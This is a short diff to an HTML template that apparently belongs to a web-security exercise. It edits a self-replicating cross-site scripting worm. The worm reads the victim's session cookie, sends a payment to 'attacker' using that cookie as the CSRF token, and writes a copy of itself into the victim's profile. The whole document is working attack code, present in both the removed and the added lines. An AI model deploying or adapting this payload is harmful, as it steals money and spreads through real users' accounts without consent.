@@ -52,7 +52,6 @@
   let payXhr = new XMLHttpRequest();
   payXhr.open("POST", "/pay");
   payXhr.send(`recipient=attacker&amount=1&csrf-token=${cookieValue}`);
-  let formData2 = new FormData();
   
   const scriptContent = encodeURIComponent(`<script>${currentScript}<\/script>`);
   let profileXhr = new XMLHttpRequest();
@@ -60,7 +59,6 @@
   profileXhr.send(`aboutme=${scriptContent}`);
 </script>
 
-<script id="script"> const cookieValue = document.cookie .split('; ') .find(row => row.startsWith('session=')) .split('=')[1]; let payXhr = new XMLHttpRequest(); payXhr.open("POST", "/pay"); payXhr.send(`recipient=attacker&amount=1&csrf-token=${cookieValue}`); let formData2 = new FormData(); const scriptContent = encodeURIComponent(`<script>${currentScript}<\/script>`); let profileXhr = new XMLHttpRequest(); profileXhr.open("POST", "/aboutme"); profileXhr.send(`aboutme=${scriptContent}`);</script> -->
-
+<script id="script"> const cookieValue = document.cookie .split('; ') .find(row => row.startsWith('session=')) .split('=')[1]; let payXhr = new XMLHttpRequest(); payXhr.open("POST", "/pay"); payXhr.send(`recipient=attacker&amount=1&csrf-token=${cookieValue}`); const scriptContent = encodeURIComponent(`<script>${currentScript}<\/script>`); let profileXhr = new XMLHttpRequest(); profileXhr.open("POST", "/aboutme"); profileXhr.send(`aboutme=${scriptContent}`);</script> -->
 {% endif %}
 {% endblock %}
